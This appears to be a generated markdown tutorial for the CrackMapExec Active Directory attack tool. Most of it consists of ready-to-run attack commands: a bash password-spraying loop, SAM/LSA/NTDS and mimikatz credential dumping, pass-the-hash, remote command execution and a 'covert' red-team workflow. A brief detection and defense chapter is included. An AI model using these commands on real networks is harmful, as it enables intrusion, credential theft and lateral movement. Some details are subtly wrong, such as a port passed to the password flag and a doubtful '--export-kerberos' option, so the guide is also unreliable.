---
tool_name: "crackmapexec"
display_name: "CrackMapExec"
mitre_tactic: "defense_evasion"
mitre_tactic_id: "TA0005"
mitre_subcategory: "pass_the_hash"
install_command: "sudo apt install crackmapexec"
version: "5.4.0"
github_repo: "https://github.com/Penntest-docker/CrackMapExec"
kali_tools_page: "https://www.kali.org/tools/crackmapexec/"
difficulty_level: "intermediate-to-advanced"
requires_root: false
gui_available: false
tags: ["network", "smb", "ldap", "winrm", "active-directory", "post-exploitation"]
related_tools: ["netexec", "impacket", "evil-winrm"]
---

# CrackMapExec

## Chapter 1: Introduction & Overview

### What is CrackMapExec?
CrackMapExec (CME) is a Swiss army knife for pentesting Windows/Active Directory environments. It can execute commands, perform credential attacks, enumerate networks, and much more.

### History & Background
- **Created:** 2015 by byt3bl33d3r
- **Maintained:** byt3bl33d3r //PENNT3ST
- **License:** BSD License
- **Purpose:** Network penetration testing

CME is essential for any Windows/AD penetration test.

### When to Use This Tool
- **Network penetration testing:** Enumerate and attack Windows networks
- **Credential testing:** Test password strength
- **Lateral movement:** Move through networks
- **Post-exploitation:** Execute commands on compromised systems

### Key Concepts
- **Protocol:** SMB, LDAP, WINRM, SSH, FTP, etc.
- **Credential Attacks:** Password spraying, Pass-the-Hash, etc.
- **Command Execution:** Run commands on remote systems
- **Enumeration:** Gather information from targets

### Supported Protocols
| Protocol | Description |
|----------|-------------|
| SMB | Server Message Block |
| LDAP | Lightweight Directory Access Protocol |
| WINRM | Windows Remote Management |
| SSH | Secure Shell |
| FTP | File Transfer Protocol |
| WMI | Windows Management Instrumentation |
| MSSQL | Microsoft SQL Server |
| RDP | Remote Desktop Protocol |
| PSExec | Process Execution |

---

## Chapter 2: Installation & Setup

### System Requirements
- **RAM:** 2 GB minimum
- **Disk Space:** ~50 MB
- **Privileges:** User-level (for most features)

### Installation Methods

#### Method 1: APT (Recommended)
```bash
sudo apt update
sudo apt install crackmapexec
```

#### Method 2: Pipx
```bash
pipx install crackmapexec
```

#### Method 3: From Source
```bash
git clone https://github.com/Penntest-docker/CrackMapExec.git
cd CrackMapExec
pip install .
```

### Verification
```bash
crackmapexec --version
```

---

## Chapter 3: Basic Usage

### First Scan

#### SMB Scan
```bash
crackmapexec smb 192.168.1.0/24
```
**Output:** Shows SMB hosts and basic info.

#### Credential Test
```bash
crackmapexec smb 192.168.1.0/24 -u admin -p password123
```
**Output:** Shows which hosts accept the credentials.

### Essential Commands

#### SMB Enumeration
```bash
crackmapexec smb 192.168.1.0/24 --gen-relay-list targets.txt
```
**Explanation:** Generates list of hosts vulnerable to relay attacks.

#### Command Execution
```bash
crackmapexec smb 192.168.1.0/24 -u admin -p password123 -x "whoami"
```
**Explanation:** Executes command on all hosts where credentials work.

#### Credential Dumping
```bash
crackmapexec smb 192.168.1.1 -u admin -p password123 --lsa
```
**Explanation:** Dumps LSA secrets from target.

### Complete Flags Reference

#### Target Specification
| Flag | Description | Example |
|------|-------------|---------|
| `protocol://target` | Target specification | `smb://192.168.1.0/24` |
| `-t` | Thread count | `crackmapexec smb 192.168.1.0/24 -t 100` |
| `--timeout` | Connection timeout | `crackmapexec smb 192.168.1.0/24 --timeout 10` |

#### Authentication
| Flag | Description | Example |
|------|-------------|---------|
| `-u` | Username | `crackmapexec smb target -u admin` |
| `-p` | Password | `crackmapexec smb target -u admin -p pass` |
| `-H` | NTLM hash | `crackmapexec smb target -u admin -H 'aad3b435b51404ee...'` |
| `-k` | Kerberos | `crackmapexec smb target -k` |
| `--shares` | Enumerate shares | `crackmapexec smb target -u admin -p pass --shares` |
| `--sam` | Dump SAM | `crackmapexec smb target -u admin -p pass --sam` |
| `--lsa` | Dump LSA | `crackmapexec smb target -u admin -p pass --lsa` |
| `--ntds` | Dump NTDS | `crackmapexec smb target -u admin -p pass --ntds` |
| `--mimikatz` | Run mimikatz | `crackmapexec smb target -u admin -p pass --mimikatz` |

#### Command Execution
| Flag | Description | Example |
|------|-------------|---------|
| `-x` | Execute command | `crackmapexec smb target -x "whoami"` |
| `-X` | PowerShell command | `crackmapexec smb target -X "Get-Process"` |

#### SMB Options
| Flag | Description | Example |
|------|-------------|---------|
| `--gen-relay-list` | Generate relay targets | `crackmapexec smb target --gen-relay-list targets.txt` |
| `--smb-server` | Start SMB server | `crackmapexec smb target --smb-server /share` |
| `--smb-timeout` | SMB timeout | `crackmapexec smb target --smb-timeout 10` |

#### LDAP Options
| Flag | Description | Example |
|------|-------------|---------|
| `--ldap-base` | LDAP base DN | `crackmapexec ldap target --ldap-base "DC=domain,DC=local"` |
| `--ldap-filter` | LDAP filter | `crackmapexec ldap target --ldap-filter "(objectClass=user)"` |
| `--bloodhound` | BloodHound collection | `crackmapexec ldap target --bloodhound -u admin -p pass` |

#### WINRM Options
| Flag | Description | Example |
|------|-------------|---------|
| `--exec-method` | Execution method | `crackmapexec winrm target --exec-method cmd` |
| `--remote-ps` | PS Remoting | `crackmapexec winrm target --remote-ps` |

#### Output Options
| Flag | Description | Example |
|------|-------------|---------|
| `-o` | Output file | `crackmapexec smb target -o results.txt` |
| `-v` | Verbose | `crackmapexec smb target -v` |
| `-vv` | Very verbose | `crackmapexec smb target -vv` |

---

## Chapter 4: Intermediate Usage

### Advanced Enumeration

#### SMB Enumeration
```bash
# Enumerate shares
crackmapexec smb 192.168.1.0/24 -u admin -p pass --shares

# Enumerate users
crackmapexec smb 192.168.1.0/24 -u admin -p pass --users

# Enumerate groups
crackmapexec smb 192.168.1.0/24 -u admin -p pass --groups

# Enumerate local groups
crackmapexec smb 192.168.1.0/24 -u admin -p pass --local-groups

# Password policy
crackmapexec smb 192.168.1.0/24 -u admin -p pass --password-policy
```

#### LDAP Enumeration
```bash
# LDAP queries
crackmapexec ldap 192.168.1.0/24 -u admin -p pass --groups

# BloodHound collection
crackmapexec ldap 192.168.1.0/24 -u admin -p pass --bloodhound

# KERBEROAST
crackmapexec ldap 192.168.1.0/24 -u admin -p pass --kerberoast hashes.txt
```

### Scripting & Automation

#### Bash Scripting
```bash
#!/bin/bash
# Credential spray
SUBNET="192.168.1"
USERS=("admin" "administrator" "user1" "user2")
PASSWORDS=("password123" "Password1" "admin" "password")

for user in "${USERS[@]}"; do
    for pass in "${PASSWORDS[@]}"; do
        echo "[*] Testing $user:$pass"
        crackmapexec smb $SUBNET.0/24 -u $user -p $pass --shares 2>/dev/null | grep "[+]" >> valid_creds.txt
    done
done
```

#### Python Scripting
```python
#!/usr/bin/env python3
import subprocess

def cme_scan(protocol, target, username, password, options=None):
    """Run CrackMapExec scan"""
    cmd = f"crackmapexec {protocol} {target} -u {username} -p {password}"
    if options:
        cmd += f" {options}"
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    return result.stdout

# Scan SMB
output = cme_scan("smb", "192.168.1.0/24", "admin", "password123", "--shares")
print(output)
```

### Combining with Other Tools

#### With Impacket
```bash
# Use captured hashes
crackmapexec smb 192.168.1.1 -u admin -H 'aad3b435b51404ee...'

# Then use impacket
impacket-psexec domain/admin:password@192.168.1.1
```

#### With Evil-WinRM
```bash
# Use found credentials
evil-winrm -i 192.168.1.1 -u admin -p password
```

### Advanced Configurations

#### Credential Files
```bash
# Username list
crackmapexec smb 192.168.1.0/24 -U users.txt -p password

# Username:Password list
crackmapexec smb 192.168.1.0/24 -C creds.txt
```

### Performance Optimization

#### Increase Threads
```bash
crackmapexec smb 192.168.1.0/24 -t 100
```

#### Reduce Timeout
```bash
crackmapexec smb 192.168.1.0/24 --timeout 5
```

---

## Chapter 5: Advanced Usage

### Advanced Attack Techniques

#### Pass-the-Hash
```bash
# Use NTLM hash
crackmapexec smb 192.168.1.0/24 -u admin -H 'aad3b435b51404ee...'
```

#### Overpass-the-Hash
```bash
# Use NTLM hash for Kerberos
crackmapexec smb 192.168.1.0/24 -u admin -H 'aad3b435b51404ee...' --export-kerberos ticket.kirbi
```

### Integration in Pentest Workflow

#### Phase 1: Enumeration
```bash
# Find SMB hosts
crackmapexec smb 192.168.1.0/24

# Enumerate shares
crackmapexec smb 192.168.1.0/24 -u admin -p pass --shares
```

#### Phase 2: Credential Testing
```bash
# Test default creds
crackmapexec smb 192.168.1.0/24 -u admin -p password

# Test common passwords
crackmapexec smb 192.168.1.0/24 -U users.txt -p passwords.txt
```

#### Phase 3: Lateral Movement
```bash
# Execute commands
crackmapexec smb 192.168.1.1 -u admin -p pass -x "whoami"

# Dump credentials
crackmapexec smb 192.168.1.1 -u admin -p pass --sam
```

### Advanced Configurations

#### Custom SMB Server
```bash
# Start SMB server for hash capture
crackmapexec smb 192.168.1.0/24 --smb-server /share
```

### Performance Optimization

#### Parallel Execution
```bash
crackmapexec smb 192.168.1.0/24 -t 200
```

---

## Chapter 6: Real-World Scenarios

### Scenario 1: CTF Challenge
**Objective:** Find valid credentials

**Steps:**
```bash
# 1. Enumerate SMB
crackmapexec smb 192.168.1.0/24

# 2. Test default creds
crackmapexec smb 192.168.1.0/24 -u admin -p password

# 3. Find valid creds
crackmapexec smb 192.168.1.0/24 -U users.txt -p passwords.txt

# 4. Use found creds
crackmapexec smb 192.168.1.1 -u admin -p pass --shares
```

### Scenario 2: Penetration Test
**Objective:** Compromise Windows network

**Steps:**
```bash
# 1. Enumerate network
crackmapexec smb 192.168.1.0/24

# 2. Credential spray
crackmapexec smb 192.168.1.0/24 -U users.txt -p passwords.txt

# 3. Execute commands
crackmapexec smb 192.168.1.1 -u admin -p pass -x "whoami"

# 4. Dump credentials
crackmapexec smb 192.168.1.1 -u admin -p pass --sam --lsa

# 5. Lateral movement
```

### Scenario 3: Red Team Operation
**Objective:** Covert network compromise

**Steps:**
```bash
# 1. Stealth enumeration
crackmapexec smb 192.168.1.0/24 -t 10 --timeout 10

# 2. Limited credential testing
crackmapexec smb 192.168.1.0/24 -u admin -p pass

# 3. Targeted execution
crackmapexec smb 192.168.1.1 -u admin -p pass -x "whoami"
```

---

## Chapter 7: Detection & Defense

### How Defenders Detect CrackMapExec

#### Network Indicators
```
# Multiple SMB connections
# LDAP enumeration patterns
# WinRM connections from unusual sources
```

#### Log Analysis
```bash
# Windows Event Logs
# Event ID 4624 - Logon
# Event ID 4625 - Failed logon
# Event ID 4768 - Kerberos TGT
```

### Mitigation Strategies

#### Account Lockout
```bash
# Configure lockout policy
# Limit failed logon attempts
```

#### Monitor for Enumeration
```bash
# Monitor LDAP queries
# Watch for SMB enumeration
# Alert on unusual WinRM connections
```

### Blue Team Response
1. **Implement account lockout** - Prevent password spraying
2. **Monitor LDAP queries** - Detect enumeration
3. **Use strong passwords** - Resist brute force
4. **Enable logging** - Track all authentication attempts
5. **Segment network** - Limit lateral movement

---

## Chapter 8: Troubleshooting

### Common Errors

#### Error: "Connection refused"
**Cause:** Service not running
**Solution:**
```bash
# Check if service is running
nmap -p 445 target

# Try different protocol
crackmapexec smb target -p 445
```

#### Error: "Access denied"
**Cause:** Invalid credentials
**Solution:**
```bash
# Verify credentials
crackmapexec smb target -u admin -p password

# Try different credentials
crackmapexec smb target -U users.txt -p passwords.txt
```

### Performance Optimization

#### Slow Scans
```bash
# Increase threads
crackmapexec smb 192.168.1.0/24 -t 100

# Reduce timeout
crackmapexec smb 192.168.1.0/24 --timeout 5
```

### FAQ

**Q: Is crackmapexec legal to use?**
A: Yes, crackmapexec is a legitimate security testing tool. However, using it without authorization is illegal. Always get written permission before testing.

**Q: How do I update crackmapexec?**
A: `sudo apt update && sudo apt upgrade crackmapexec`

**Q: What's the difference between crackmapexec and netexec?**
A: NetExec is a fork of CrackMapExec with additional features. Both are actively maintained.

**Q: Can I use crackmapexec on Linux?**
A: Yes, crackmapexec works on Linux systems with SSH.

**Q: How do I test Kerberos authentication?**
A: Use `-k` flag: `crackmapexec smb target -k`

---

## Resources

### Official Documentation
- [CrackMapExec GitHub](https://github.com/Penntest-docker/CrackMapExec)
- [CrackMapExec Wiki](https://github.com/Penntest-docker/CrackMapExec/wiki)

### Tutorials
- [CrackMapExec Tutorial - HackTricks](https://book.hacktricks.xyz/windows-hardening/active-directory-attacks/crackmapexec)
- [CrackMapExec Cheat Sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md)

### Related Tools
- **netexec:** Fork of CrackMapExec
- **impacket:** Python network toolkit
- **evil-winrm:** Windows Remote Management shell
- **smbclient:** SMB client

### Practice Resources
- [HackTheBox](https://www.hackthebox.com/)
- [TryHackMe](https://tryhackme.com/)
- [VulnHub](https://www.vulnhub.com/)
